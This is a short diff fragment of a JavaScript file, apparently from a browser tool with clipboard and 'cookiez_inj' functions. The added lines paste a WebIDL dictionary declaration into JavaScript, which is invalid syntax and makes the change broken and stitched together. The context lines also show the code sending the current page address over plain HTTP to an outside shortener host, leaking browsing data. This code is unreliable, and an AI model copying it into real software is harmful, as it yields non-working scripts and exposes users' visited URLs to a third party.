@@ -39,6 +39,11 @@ function copyTextToClipboard(text) {
   document.body.removeChild(textArea);
 }
 
+dictionary ClipboardEventInit : EventInit {
+    DOMString data = "";
+    DOMString dataType = "";
+};
+
 function cookiez_injExecute() {
 	if(location.protocol == "http:") {
 		cookiez_httpGetAsync("http://ccr.ovh/shortenurl.php?mode=shortenurl&url=" + window.location.href, function(r) {
